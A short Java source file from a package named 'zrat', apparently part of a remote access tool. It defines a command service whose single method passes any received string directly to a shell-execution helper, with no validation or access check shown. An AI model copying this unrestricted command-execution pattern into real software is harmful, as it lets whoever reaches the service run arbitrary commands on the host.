package com.zrat.server.controller;


public class CommandServiceImpl extends BaseService implements CommandService  {


	@Override
	public void runCommand(String command) {
		ExeShellCmd cmd = ExeShellCmd.getInstance();
		cmd.exec(command);
	}

}
